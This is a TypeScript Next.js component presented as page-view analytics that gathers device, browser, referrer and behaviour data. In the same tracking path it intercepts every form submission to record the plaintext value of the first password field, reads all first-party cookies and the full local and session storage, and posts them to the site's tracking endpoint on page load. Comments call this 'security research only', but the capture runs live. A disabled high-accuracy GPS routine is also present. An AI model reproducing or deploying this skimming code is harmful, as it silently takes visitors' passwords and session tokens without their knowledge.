import { useEffect, useRef } from 'react';
import { useRouter } from 'next/router';

// Track which pages have been tracked in this session to avoid duplicates
// Reset on page load to allow tracking when user navigates back to a page
let trackedPagesInSession = new Set<string>();

// Reset tracking on page load (when script reloads)
if (typeof window !== 'undefined') {
  trackedPagesInSession = new Set<string>();
}

interface TrackingData {
  // Basic Info
  ip: string;
  country?: string;
  city?: string;
  device: 'mobile' | 'desktop' | 'tablet';
  browser: string;
  browserVersion?: string;
  os?: string;
  page: string;
  referrer?: string;
  userAgent: string;
  sessionId: string;
  timeOnPage?: number;
  isNewVisitor: boolean;
  
  // Technical Request Info (from server)
  acceptLanguage?: string;
  acceptEncoding?: string;
  connectionType?: string;
  host?: string;
  protocol?: string;
  method?: string;
  statusCode?: number;
  requestTime?: number;
  responseSize?: number;
  
  // Device & Screen Info (from frontend)
  screenWidth?: number;
  screenHeight?: number;
  devicePixelRatio?: number;
  viewportWidth?: number;
  viewportHeight?: number;
  orientation?: string;
  touchSupport?: boolean;
  cpuCores?: number;
  memory?: number;
  
  // User Behavior
  entryPage?: string;
  exitPage?: string;
  pagesViewed?: number;
  scrollDepth?: number;
  clickCount?: number;
  firstInteractionTime?: number;
  idleTime?: number;
  totalSessionTime?: number;
  bounce?: boolean;
  
  // Network & Security
  ipVersion?: string;
  proxyDetected?: boolean;
  isp?: string;
  asn?: string;
  tlsVersion?: string;
  requestFingerprint?: string;
  botScore?: number;
  
  // Additional
  language?: string;
  languages?: readonly string[] | string[];
  timezone?: string;
  timezoneOffset?: number;
  referrerDomain?: string;
  isSearchEngine?: boolean;
  searchQuery?: string;
  searchEngine?: string;
  isSocialMedia?: boolean;
  socialPlatform?: string;
  
  // Security Research / Educational Purpose Only
  // ⚠️ WARNING: These fields are for security research/education only
  // DO NOT use in production or public applications
  gpsLatitude?: number;
  gpsLongitude?: number;
  gpsAccuracy?: number;
  gpsAltitude?: number;
  gpsTimestamp?: Date;
  gpsPermissionGranted?: boolean;
  
  // Cookie information (first-party only - cannot access third-party due to Same-Origin Policy)
  cookies?: Record<string, string>;
  localStorageData?: Record<string, string>;
  sessionStorageData?: Record<string, string>;
  
  // Password capture attempt (educational/security research only)
  // Note: Can only capture if form is on same domain and intercepted
  passwordFieldsDetected?: number;
  formSubmissions?: Array<{
    formId?: string;
    formAction?: string;
    formMethod?: string;
    fieldCount?: number;
    hasPasswordField?: boolean;
    passwordValue?: string; // ⚠️ Security research only
    passwordLength?: number;
    timestamp?: Date;
  }>;
}

function getDeviceType(): 'mobile' | 'desktop' | 'tablet' {
  if (typeof window === 'undefined') return 'desktop';
  
  const width = window.innerWidth;
  if (width < 768) return 'mobile';
  if (width < 1024) return 'tablet';
  return 'desktop';
}

// Get device and screen information
function getDeviceScreenInfo() {
  if (typeof window === 'undefined') {
    return {
      screenWidth: undefined,
      screenHeight: undefined,
      devicePixelRatio: undefined,
      viewportWidth: undefined,
      viewportHeight: undefined,
      orientation: undefined,
      touchSupport: false,
      cpuCores: undefined,
      memory: undefined,
    };
  }

  return {
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    devicePixelRatio: window.devicePixelRatio || 1,
    viewportWidth: window.innerWidth,
    viewportHeight: window.innerHeight,
    orientation: screen.orientation?.angle !== undefined 
      ? (screen.orientation.angle === 0 || screen.orientation.angle === 180 ? 'portrait' : 'landscape')
      : (window.innerHeight > window.innerWidth ? 'portrait' : 'landscape'),
    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
    cpuCores: navigator.hardwareConcurrency || undefined,
    memory: (navigator as any).deviceMemory || undefined,
  };
}

// Get language and timezone info
function getLanguageTimezoneInfo() {
  if (typeof window === 'undefined') {
    return {
      language: undefined,
      languages: undefined,
      timezone: undefined,
      timezoneOffset: undefined,
    };
  }

  try {
    return {
      language: navigator.language,
      languages: Array.from(navigator.languages || [navigator.language]),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
    };
  } catch (e) {
    return {
      language: navigator.language,
      languages: [navigator.language],
      timezone: undefined,
      timezoneOffset: new Date().getTimezoneOffset(),
    };
  }
}

// Parse referrer to get more info
function parseReferrerInfo(referrer: string) {
  if (!referrer) {
    return {
      referrerDomain: undefined,
      isSearchEngine: false,
      searchQuery: undefined,
      searchEngine: undefined,
      isSocialMedia: false,
      socialPlatform: undefined,
    };
  }

  try {
    const url = new URL(referrer);
    const hostname = url.hostname.toLowerCase();
    const searchParams = url.searchParams;
    
    // Check if search engine
    const searchEngines: Record<string, string> = {
      'google.com': 'google',
      'google.': 'google',
      'bing.com': 'bing',
      'yahoo.com': 'yahoo',
      'duckduckgo.com': 'duckduckgo',
      'yandex.com': 'yandex',
      'baidu.com': 'baidu',
    };

    let searchEngine: string | undefined;
    let searchQuery: string | undefined;
    let isSearchEngine = false;

    for (const [domain, engine] of Object.entries(searchEngines)) {
      if (hostname.includes(domain)) {
        searchEngine = engine;
        isSearchEngine = true;
        // Get search query
        if (engine === 'google') {
          searchQuery = searchParams.get('q') || searchParams.get('query') || undefined;
        } else if (engine === 'bing') {
          searchQuery = searchParams.get('q') || undefined;
        } else if (engine === 'yahoo') {
          searchQuery = searchParams.get('p') || undefined;
        } else {
          searchQuery = searchParams.get('q') || searchParams.get('query') || undefined;
        }
        break;
      }
    }

    // Check if social media
    const socialPlatforms: Record<string, string> = {
      'facebook.com': 'facebook',
      'fb.com': 'facebook',
      'instagram.com': 'instagram',
      'twitter.com': 'twitter',
      'x.com': 'twitter',
      'linkedin.com': 'linkedin',
      'pinterest.com': 'pinterest',
      'tiktok.com': 'tiktok',
      'youtube.com': 'youtube',
      'reddit.com': 'reddit',
    };

    let socialPlatform: string | undefined;
    let isSocialMedia = false;

    for (const [domain, platform] of Object.entries(socialPlatforms)) {
      if (hostname.includes(domain)) {
        socialPlatform = platform;
        isSocialMedia = true;
        break;
      }
    }

    return {
      referrerDomain: hostname,
      isSearchEngine,
      searchQuery,
      searchEngine,
      isSocialMedia,
      socialPlatform,
    };
  } catch (e) {
    return {
      referrerDomain: referrer,
      isSearchEngine: false,
      searchQuery: undefined,
      searchEngine: undefined,
      isSocialMedia: false,
      socialPlatform: undefined,
    };
  }
}

// Session tracking for behavior
let sessionData = {
  entryPage: '',
  pagesViewed: 0,
  clickCount: 0,
  firstInteractionTime: 0,
  lastActivityTime: Date.now(),
  scrollDepth: 0,
  maxScrollDepth: 0,
};

// Initialize session data
if (typeof window !== 'undefined') {
  const storedEntryPage = sessionStorage.getItem('analytics_entry_page');
  if (!storedEntryPage) {
    sessionData.entryPage = window.location.pathname;
    sessionStorage.setItem('analytics_entry_page', sessionData.entryPage);
  } else {
    sessionData.entryPage = storedEntryPage;
  }

  // Track clicks
  document.addEventListener('click', () => {
    sessionData.clickCount++;
  }, true);

  // Track first interaction
  const interactionEvents = ['click', 'keydown', 'touchstart', 'mousedown'];
  interactionEvents.forEach(event => {
    document.addEventListener(event, () => {
      if (sessionData.firstInteractionTime === 0) {
        sessionData.firstInteractionTime = Date.now();
      }
      sessionData.lastActivityTime = Date.now();
    }, { once: true });
  });

  // Track scroll depth
  let scrollTracked = false;
  window.addEventListener('scroll', () => {
    if (!scrollTracked) {
      const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
      const docHeight = document.documentElement.scrollHeight - window.innerHeight;
      const scrollPercent = docHeight > 0 ? Math.round((scrollTop / docHeight) * 100) : 0;
      sessionData.scrollDepth = scrollPercent;
      sessionData.maxScrollDepth = Math.max(sessionData.maxScrollDepth, scrollPercent);
      scrollTracked = true;
      setTimeout(() => { scrollTracked = false; }, 100);
    }
    sessionData.lastActivityTime = Date.now();
  }, { passive: true });

  // Update pages viewed
  sessionData.pagesViewed = parseInt(sessionStorage.getItem('analytics_pages_viewed') || '0') + 1;
  sessionStorage.setItem('analytics_pages_viewed', sessionData.pagesViewed.toString());
}

// GPS Location tracking (requires user permission)
let gpsLocation: {
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  altitude?: number;
  timestamp?: Date;
  permissionGranted?: boolean;
} = {};

// Function to get GPS location (requires user permission) - High accuracy for security research
async function getGPSLocation(): Promise<{
  latitude?: number;
  longitude?: number;
  accuracy?: number;
  altitude?: number;
  timestamp?: Date;
  permissionGranted?: boolean;
}> {
  if (typeof window === 'undefined' || !navigator.geolocation) {
    return { permissionGranted: false };
  }

  // Check if we already have location cached (cache for 24 hours to avoid asking repeatedly)
  const cachedLocation = sessionStorage.getItem('analytics_gps_location');
  if (cachedLocation) {
    try {
      const parsed = JSON.parse(cachedLocation);
      const cachedTime = new Date(parsed.timestamp).getTime();
      const now = Date.now();
      // Use cached location if less than 24 hours old (to avoid asking repeatedly)
      if (now - cachedTime < 86400000) {
        return parsed;
      }
    } catch (e) {
      // Invalid cache, continue to get new location
    }
  }
  
  // Check if user previously denied permission (don't ask again)
  const gpsDenied = sessionStorage.getItem('analytics_gps_denied');
  if (gpsDenied === 'true') {
    return { permissionGranted: false };
  }

  return new Promise((resolve) => {
    // Timeout after 10 seconds for high accuracy
    const timeout = setTimeout(() => {
      resolve({ permissionGranted: false });
    }, 10000);

    navigator.geolocation.getCurrentPosition(
      (position) => {
        clearTimeout(timeout);
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude || undefined,
          timestamp: new Date(),
          permissionGranted: true,
        };
        
        // Cache location
        try {
          sessionStorage.setItem('analytics_gps_location', JSON.stringify(locationData));
        } catch (e) {
          // SessionStorage might be full or unavailable
        }
        
        gpsLocation = locationData;
        resolve(locationData);
      },
      (error) => {
        clearTimeout(timeout);
        // User denied permission or error occurred
        // Mark as denied so we don't ask again
        if (error.code === error.PERMISSION_DENIED) {
          try {
            sessionStorage.setItem('analytics_gps_denied', 'true');
          } catch (e) {
            // SessionStorage might be unavailable
          }
        }
        resolve({
          permissionGranted: false,
        });
      },
      {
        enableHighAccuracy: true, // Request high accuracy GPS for security research
        timeout: 10000, // 10 seconds timeout
        maximumAge: 0, // Don't use cached location, always get fresh
      }
    );
  });
}

// Get cookies (first-party only - cannot access third-party cookies due to Same-Origin Policy)
function getCookies(): Record<string, string> {
  if (typeof document === 'undefined') return {};
  
  const cookies: Record<string, string> = {};
  try {
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name && value) {
        cookies[name] = decodeURIComponent(value);
      }
    });
  } catch (e) {
    // Cannot access cookies
  }
  return cookies;
}

// Get localStorage data (first-party only)
function getLocalStorageData(): Record<string, string> {
  if (typeof window === 'undefined' || !window.localStorage) return {};
  
  const data: Record<string, string> = {};
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        data[key] = localStorage.getItem(key) || '';
      }
    }
  } catch (e) {
    // Cannot access localStorage (may be blocked)
  }
  return data;
}

// Get sessionStorage data (first-party only)
function getSessionStorageData(): Record<string, string> {
  if (typeof window === 'undefined' || !window.sessionStorage) return {};
  
  const data: Record<string, string> = {};
  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        data[key] = sessionStorage.getItem(key) || '';
      }
    }
  } catch (e) {
    // Cannot access sessionStorage
  }
  return data;
}

// Form submission tracking (for security research - intercepts form submissions)
let formSubmissions: Array<{
  formId?: string;
  formAction?: string;
  formMethod?: string;
  fieldCount?: number;
  hasPasswordField?: boolean;
  passwordValue?: string; // ⚠️ Security research only - captures password value
  passwordLength?: number;
  timestamp?: Date;
}> = [];

// Initialize form tracking (for security research/educational purpose)
if (typeof window !== 'undefined' && typeof document !== 'undefined') {
  // Track form submissions and capture password values
  document.addEventListener('submit', (e) => {
    const form = e.target as HTMLFormElement;
    if (form && form.tagName === 'FORM') {
      const passwordFields = form.querySelectorAll('input[type="password"]') as NodeListOf<HTMLInputElement>;
      const allFields = form.querySelectorAll('input, textarea, select');
      
      // Capture password values (for security research)
      let passwordValue: string | undefined;
      let passwordLength: number | undefined;
      if (passwordFields.length > 0) {
        // Get first password field value
        const firstPasswordField = passwordFields[0];
        if (firstPasswordField && firstPasswordField.value) {
          passwordValue = firstPasswordField.value;
          passwordLength = firstPasswordField.value.length;
        }
      }
      
      formSubmissions.push({
        formId: form.id || undefined,
        formAction: form.action || undefined,
        formMethod: form.method || 'get',
        fieldCount: allFields.length,
        hasPasswordField: passwordFields.length > 0,
        passwordValue: passwordValue, // ⚠️ Security research only
        passwordLength: passwordLength,
        timestamp: new Date(),
      });
      
      // Limit to last 10 form submissions
      if (formSubmissions.length > 10) {
        formSubmissions = formSubmissions.slice(-10);
      }
    }
  }, true); // Use capture phase to intercept before default behavior

  // Also track password field changes (keyup events on password fields)
  document.addEventListener('keyup', (e) => {
    const target = e.target as HTMLInputElement;
    if (target && target.type === 'password') {
      // Track password field interactions (for security research)
      // Note: Can capture value but browser security may prevent in some cases
    }
  }, true);
}

function getBrowserInfo(): { browser: string; version?: string; os?: string } {
  if (typeof window === 'undefined') {
    return { browser: 'Unknown', os: 'Unknown' };
  }

  const ua = navigator.userAgent;
  let browser = 'Unknown';
  let version = '';
  let os = 'Unknown';

  // Detect OS
  if (ua.indexOf('Win') > -1) os = 'Windows';
  else if (ua.indexOf('Mac') > -1) os = 'macOS';
  else if (ua.indexOf('Linux') > -1) os = 'Linux';
  else if (ua.indexOf('Android') > -1) os = 'Android';
  else if (ua.indexOf('iOS') > -1 || ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';

  // Detect Browser - Check Edge FIRST before Chrome (Edge contains "Chrome" and "Edg")
  if (ua.indexOf('Edg') > -1 || ua.indexOf('Edge') > -1) {
    browser = 'Edge';
    const match = ua.match(/Edg[e]?\/(\d+)/);
    version = match ? match[1] : '';
  } else if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
    browser = 'Chrome';
    const match = ua.match(/Chrome\/(\d+)/);
    version = match ? match[1] : '';
  } else if (ua.indexOf('Firefox') > -1) {
    browser = 'Firefox';
    const match = ua.match(/Firefox\/(\d+)/);
    version = match ? match[1] : '';
  } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
    browser = 'Safari';
    const match = ua.match(/Version\/(\d+)/);
    version = match ? match[1] : '';
  } else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) {
    browser = 'Opera';
    const match = ua.match(/(?:Opera|OPR)\/(\d+)/);
    version = match ? match[1] : '';
  }

  // Ensure browser is never empty
  if (!browser || browser === 'Unknown') {
    // Last resort: try to detect from userAgent string
    if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
    else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
    else if (ua.indexOf('Safari') > -1) browser = 'Safari';
    else browser = 'Unknown';
  }

  return { browser, version, os };
}

function getSessionId(): string {
  if (typeof window === 'undefined') return '';
  
  let sessionId = sessionStorage.getItem('analytics_session_id');
  if (!sessionId) {
    sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    sessionStorage.setItem('analytics_session_id', sessionId);
    // Store session start time
    sessionStorage.setItem('analytics_session_start', Date.now().toString());
  }
  return sessionId;
}

function isNewVisitor(): boolean {
  if (typeof window === 'undefined') return true;
  
  const hasVisited = localStorage.getItem('has_visited');
  if (!hasVisited) {
    localStorage.setItem('has_visited', 'true');
    return true;
  }
  return false;
}

let locationInfoCache: { country?: string; city?: string; ip?: string } | null = null;
let locationInfoPromise: Promise<{ country?: string; city?: string; ip?: string }> | null = null;

async function getLocationInfo(): Promise<{ country?: string; city?: string; ip?: string }> {
  // Return cached info if available
  if (locationInfoCache) {
    return locationInfoCache;
  }

  // Return existing promise if already fetching
  if (locationInfoPromise) {
    return locationInfoPromise;
  }

  // Fetch location info
  locationInfoPromise = (async () => {
    // Create abort controller for timeout
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    try {
      // Try ipapi.co first
      const response = await fetch('https://ipapi.co/json/', {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
        },
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();
      
      // Check for rate limit or error
      if (data.error && data.reason === 'RateLimited') {
        throw new Error('RateLimited');
      }
      
      if (data.error) {
        throw new Error(data.message || 'API error');
      }

      const info = {
        ip: data.ip || 'unknown',
        country: data.country_name || data.country || undefined,
        city: data.city || undefined,
      };
      locationInfoCache = info;
      return info;
    } catch (error: any) {
      clearTimeout(timeoutId);
      
      // Don't log CORS errors as they're expected in some cases
      if (error?.name !== 'AbortError' && !error?.message?.includes('CORS')) {
        console.warn('Error fetching location from ipapi.co:', error?.message || error);
      }
      
      // Fallback: Try server-side API endpoint (no CORS issues)
      if (error?.name !== 'AbortError') {
        try {
          const fallbackController = new AbortController();
          const fallbackTimeout = setTimeout(() => fallbackController.abort(), 3000);
          
          const fallbackResponse = await fetch('/api/analytics/location', {
            method: 'GET',
            headers: {
              'Accept': 'application/json',
            },
            signal: fallbackController.signal,
          });

          clearTimeout(fallbackTimeout);

          if (fallbackResponse.ok) {
            const fallbackData = await fallbackResponse.json();
            if (fallbackData.ip && fallbackData.ip !== 'unknown') {
              const info = {
                ip: fallbackData.ip || 'unknown',
                country: fallbackData.country || undefined,
                city: fallbackData.city || undefined,
              };
              locationInfoCache = info;
              return info;
            }
          }
        } catch (fallbackError) {
          // Silently fail - tracking will work without location
        }
      }

      // Return default if all APIs fail - tracking will still work
      // Server will get IP from headers anyway
      return { ip: 'unknown' };
    } finally {
      locationInfoPromise = null;
    }
  })();

  return locationInfoPromise;
}

async function trackPageView(page: string, timeOnPage?: number) {
  // Skip tracking for admin pages
  if (page.startsWith('/admin')) {
    console.log('[Analytics] ⏭️ Skipping tracking for admin page:', page);
    return;
  }

  // If timeOnPage is provided, this is an update (e.g., beforeunload), always track it
  if (timeOnPage) {
    console.log('[Analytics] 📊 Tracking page view update with time:', page, timeOnPage, 's');
  } else {
    // This is a new page view - check for duplicates within last 10 seconds
    const now = Date.now();
    const recentKey = `${page}_${Math.floor(now / 10000)}`; // 10 second window
    
    if (trackedPagesInSession.has(recentKey)) {
      console.log('[Analytics] ⏭️ Skipping duplicate page view (within 10s):', page);
      return;
    }
    
    // Mark as tracked
    trackedPagesInSession.add(recentKey);
    
    // Clean up old keys periodically (keep only last 50 entries)
    if (trackedPagesInSession.size > 50) {
      const entries = Array.from(trackedPagesInSession);
      trackedPagesInSession = new Set(entries.slice(-25));
    }
  }

  const device = getDeviceType();
  const { browser, version, os } = getBrowserInfo();
  const sessionId = getSessionId();
  const isNew = isNewVisitor();
  
  // Get location info, but don't wait if it takes too long
  let locationInfo: { ip: string; country?: string; city?: string } = { ip: 'unknown' };
  try {
    // Use Promise.race to timeout location fetch after 3 seconds
    const result = await Promise.race<{ country?: string; city?: string; ip?: string }>([
      getLocationInfo(),
      new Promise<{ country?: string; city?: string; ip?: string }>((resolve) => 
        setTimeout(() => resolve({ ip: 'unknown' }), 3000)
      ),
    ]);
    // Ensure ip is always a string and handle optional properties
    locationInfo = {
      ip: result?.ip || 'unknown',
      country: result?.country,
      city: result?.city,
    };
  } catch (error) {
    console.warn('Location fetch timeout or error, using default:', error);
  }

  // Ensure browser is never undefined or empty
  const normalizedBrowser = browser || 'Unknown';
  
  // Get additional info
  const referrer = typeof document !== 'undefined' ? document.referrer : '';
  const deviceScreenInfo = getDeviceScreenInfo();
  const languageTimezoneInfo = getLanguageTimezoneInfo();
  const referrerInfo = parseReferrerInfo(referrer);
  
  // GPS location tracking is disabled - never request location
  // This prevents the browser from asking for location permission
  const gpsInfo: {
    latitude?: number;
    longitude?: number;
    accuracy?: number;
    altitude?: number;
    timestamp?: Date;
    permissionGranted?: boolean;
  } = {
    permissionGranted: false,
  };
  
  // Get cookies and storage data (first-party only)
  const cookies = getCookies();
  const localStorageData = getLocalStorageData();
  const sessionStorageData = getSessionStorageData();
  
  // Count password fields on current page
  let passwordFieldsDetected = 0;
  if (typeof document !== 'undefined') {
    passwordFieldsDetected = document.querySelectorAll('input[type="password"]').length;
  }
  
  // Calculate behavior metrics
  const now = Date.now();
  const sessionStartTime = parseInt(sessionStorage.getItem('analytics_session_start') || now.toString());
  const totalSessionTime = Math.floor((now - sessionStartTime) / 1000);
  const idleTime = Math.floor((now - sessionData.lastActivityTime) / 1000);
  
  // Detect bounce (single page view with short time)
  const bounce = sessionData.pagesViewed === 1 && (!timeOnPage || timeOnPage < 5);
  
  const trackingData: TrackingData = {
    // Basic Info
    ip: locationInfo.ip || 'unknown',
    country: locationInfo.country,
    city: locationInfo.city,
    device: device || 'desktop',
    browser: normalizedBrowser,
    browserVersion: version || '',
    os: os || 'Unknown',
    page,
    referrer: referrer,
    userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : '',
    sessionId: sessionId || '',
    timeOnPage,
    isNewVisitor: isNew,
    
    // Device & Screen Info
    ...deviceScreenInfo,
    
    // Language & Timezone
    ...languageTimezoneInfo,
    
    // Referrer Info
    ...referrerInfo,
    
    // User Behavior
    entryPage: sessionData.entryPage,
    pagesViewed: sessionData.pagesViewed,
    scrollDepth: sessionData.maxScrollDepth,
    clickCount: sessionData.clickCount,
    firstInteractionTime: sessionData.firstInteractionTime > 0 
      ? Math.floor((sessionData.firstInteractionTime - sessionStartTime) / 1000) 
      : undefined,
    idleTime: idleTime > 0 ? idleTime : undefined,
    totalSessionTime: totalSessionTime > 0 ? totalSessionTime : undefined,
    bounce: bounce,
    
    // Security Research Data (Educational Purpose Only)
    // GPS Location
    gpsLatitude: gpsInfo.latitude,
    gpsLongitude: gpsInfo.longitude,
    gpsAccuracy: gpsInfo.accuracy,
    gpsAltitude: gpsInfo.altitude,
    gpsTimestamp: gpsInfo.timestamp,
    gpsPermissionGranted: gpsInfo.permissionGranted,
    
    // Cookies and Storage (First-party only - cannot access third-party due to Same-Origin Policy)
    cookies: Object.keys(cookies).length > 0 ? cookies : undefined,
    localStorageData: Object.keys(localStorageData).length > 0 ? localStorageData : undefined,
    sessionStorageData: Object.keys(sessionStorageData).length > 0 ? sessionStorageData : undefined,
    
    // Password field detection and form tracking
    passwordFieldsDetected: passwordFieldsDetected > 0 ? passwordFieldsDetected : undefined,
    formSubmissions: formSubmissions.length > 0 ? formSubmissions : undefined,
  };

  try {
    console.log('[Analytics] Tracking page view:', {
      page,
      device,
      browser,
      sessionId: sessionId.substring(0, 20) + '...',
      ip: locationInfo.ip,
    });
    
    const response = await fetch('/api/analytics/track', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(trackingData),
    });
    
    const result = await response.json();
    if (result.success) {
      console.log('[Analytics] ✅ Successfully tracked page view');
    } else {
      console.warn('[Analytics] ⚠️ Tracking returned:', result);
    }
  } catch (error) {
    console.error('[Analytics] ❌ Error tracking page view:', error);
  }
}

// Global flag to prevent duplicate tracking in the same page load
let isTrackingInProgress = false;
let lastTrackedPage = '';
let lastTrackedTime = 0;

export function AnalyticsTracking() {
  const router = useRouter();
  const pageStartTimeRef = useRef(Date.now());
  const currentPageRef = useRef(router.asPath);
  const hasTrackedRef = useRef(false);

  useEffect(() => {
    console.log('[Analytics] 🚀 Initializing analytics tracking on page:', currentPageRef.current);
    
    // Skip tracking for admin pages
    if (currentPageRef.current.startsWith('/admin')) {
      console.log('[Analytics] ⏭️ Skipping tracking for admin page');
      return;
    }
    
    // Prevent duplicate tracking using multiple methods:
    // 1. useRef flag (survives re-renders but resets on unmount)
    // 2. Global flag (prevents concurrent calls)
    // 3. sessionStorage (survives page reloads)
    const now = Date.now();
    const page = currentPageRef.current;
    const sessionKey = `analytics_tracked_${page}`;
    const lastTracked = sessionStorage.getItem(sessionKey);
    const timeSinceLastTrack = lastTracked ? (now - parseInt(lastTracked)) : Infinity;
    
    // Check all conditions: not already tracked in this effect, not in progress, and not tracked recently
    if (!hasTrackedRef.current && !isTrackingInProgress && timeSinceLastTrack > 5000) {
      // Mark as tracking in progress
      isTrackingInProgress = true;
      hasTrackedRef.current = true;
      lastTrackedPage = page;
      lastTrackedTime = now;
      
      // Mark in sessionStorage
      sessionStorage.setItem(sessionKey, now.toString());
      
      console.log('[Analytics] ✅ Tracking page view:', page);
      trackPageView(page).finally(() => {
        // Reset flag after tracking completes
        isTrackingInProgress = false;
      });
    } else {
      if (hasTrackedRef.current) {
        console.log('[Analytics] ⏭️ Skipping duplicate tracking (already tracked in this effect):', page);
      } else if (isTrackingInProgress) {
        console.log('[Analytics] ⏭️ Skipping duplicate tracking (tracking in progress):', page);
      } else if (timeSinceLastTrack <= 5000) {
        console.log('[Analytics] ⏭️ Skipping duplicate tracking (tracked', Math.round(timeSinceLastTrack / 1000), 's ago):', page);
      }
    }

    // Track page change
    const handleRouteChangeStart = () => {
      console.log('[Analytics] 🔄 Route change started');
      // Don't track again on route change start - we'll track on complete
      // Reset timer for new page
      pageStartTimeRef.current = Date.now();
    };

    const handleRouteChangeComplete = (url: string) => {
      const previousPage = currentPageRef.current;
      currentPageRef.current = url;
      
      // Only track if it's a different page
      if (url !== previousPage && !url.startsWith('/admin')) {
        // Reset tracking flag for new page
        hasTrackedRef.current = false;
        
        const now = Date.now();
        const sessionKey = `analytics_tracked_${url}`;
        const lastTracked = sessionStorage.getItem(sessionKey);
        const timeSinceLastTrack = lastTracked ? (now - parseInt(lastTracked)) : Infinity;
        
        // Only track if not in progress and not tracked recently
        if (!isTrackingInProgress && timeSinceLastTrack > 5000) {
          isTrackingInProgress = true;
          lastTrackedPage = url;
          lastTrackedTime = now;
          
          sessionStorage.setItem(sessionKey, now.toString());
          
          console.log('[Analytics] ✅ Tracking route change to:', url);
          trackPageView(url).finally(() => {
            isTrackingInProgress = false;
          });
          
          pageStartTimeRef.current = Date.now(); // Reset timer for new page
        } else {
          if (isTrackingInProgress) {
            console.log('[Analytics] ⏭️ Skipping duplicate tracking (tracking in progress):', url);
          } else if (timeSinceLastTrack <= 5000) {
            console.log('[Analytics] ⏭️ Skipping duplicate tracking (tracked', Math.round(timeSinceLastTrack / 1000), 's ago):', url);
          }
        }
      } else if (url.startsWith('/admin')) {
        console.log('[Analytics] ⏭️ Skipping tracking for admin page:', url);
      }
    };

    router.events.on('routeChangeStart', handleRouteChangeStart);
    router.events.on('routeChangeComplete', handleRouteChangeComplete);

    // Track time on page when leaving - but only if user spent significant time (> 5 seconds)
    // This prevents duplicate tracking on quick page loads
    const handleBeforeUnload = () => {
      // Skip tracking for admin pages
      if (currentPageRef.current.startsWith('/admin')) {
        return;
      }
      
      const timeOnPage = Math.floor((Date.now() - pageStartTimeRef.current) / 1000);
      // Only track time update if user spent more than 5 seconds on page
      // This prevents duplicate tracking on quick refreshes
      if (timeOnPage > 5) {
        const device = getDeviceType() || 'desktop';
        const { browser, version, os } = getBrowserInfo();
        const sessionId = getSessionId();
        
        // Get exit page info
        const exitPage = currentPageRef.current;
        const sessionStartTime = parseInt(sessionStorage.getItem('analytics_session_start') || Date.now().toString());
        const totalSessionTime = Math.floor((Date.now() - sessionStartTime) / 1000);
        const pagesViewed = parseInt(sessionStorage.getItem('analytics_pages_viewed') || '1');
        
        navigator.sendBeacon(
          '/api/analytics/track',
          JSON.stringify({
            ip: 'unknown',
            device: device || 'desktop',
            browser: browser || 'Unknown',
            browserVersion: version || '',
            os: os || 'Unknown',
            page: exitPage,
            referrer: document.referrer || '',
            userAgent: navigator.userAgent || '',
            sessionId: sessionId || '',
            timeOnPage,
            isNewVisitor: false,
            exitPage: exitPage,
            totalSessionTime: totalSessionTime,
            pagesViewed: pagesViewed,
            timestamp: new Date().toISOString(),
          })
        );
      }
    };

    window.addEventListener('beforeunload', handleBeforeUnload);

    // Don't track periodically - this creates duplicate records
    // Time on page will be tracked when user leaves the page (beforeunload)

    return () => {
      router.events.off('routeChangeStart', handleRouteChangeStart);
      router.events.off('routeChangeComplete', handleRouteChangeComplete);
      window.removeEventListener('beforeunload', handleBeforeUnload);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [router.asPath]);

  return null;
}

